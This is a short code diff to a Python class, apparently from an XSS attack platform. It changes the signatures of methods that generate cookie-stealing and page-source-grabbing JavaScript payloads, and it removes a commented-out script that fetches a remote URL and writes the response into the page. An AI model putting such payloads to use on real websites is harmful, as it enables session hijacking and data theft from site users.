@@ -31,7 +31,7 @@ class XxsTemplate(BaseTemplate):
         super().__init__()
         self.key = None
 
-    def xss_get_cookie(self):
+    def xss_get_cookie(self, item):
         """
         获取cookie
         """
@@ -67,7 +67,7 @@ class XxsTemplate(BaseTemplate):
     })();"""
         return self.replace_code(get_cookie_code)
 
-    def xss_get_page_code(self):
+    def xss_get_page_code(self, item):
         """
         获取源码
         """
@@ -361,31 +361,3 @@ function writeSource() {
             import traceback
             traceback.print_exc()
             return Response({'status': 'false', 'message': '操作失败'})
-        # var url= "{{url}}";
-        # function createXMLHttpRequest(){
-        #     if(window.XMLHttpRequest){
-        #         XMLHttpR = new XMLHttpRequest();
-        #     }else if(window.ActiveXObject){
-        #         try{
-        #             XMLHttpR = new ActiveXObject("Msxml2.XMLHTTP");
-        #         }catch(e){
-        #             try{
-        #                 XMLHttpR = new ActiveXObject("Microsoft.XMLHTTP");
-        #             }catch(e){
-        #             }
-        #         }
-        #     }
-        # }
-        # function sendRequest(url){
-        #     createXMLHttpRequest();
-        #     XMLHttpR.open("GET",url,true);
-        #     XMLHttpR.setRequestHeader("Content-Type","text/html;charset=utf-8");
-        #     XMLHttpR.onreadystatechange = processResponse;
-        #     XMLHttpR.send(null);
-        # }
-        # function processResponse(){
-        #     if(XMLHttpR.readyState ==4 && XMLHttpR.status == 200){
-        #         document.write(XMLHttpR.responseText);
-        #     }
-        # }
-        # sendRequest(url);
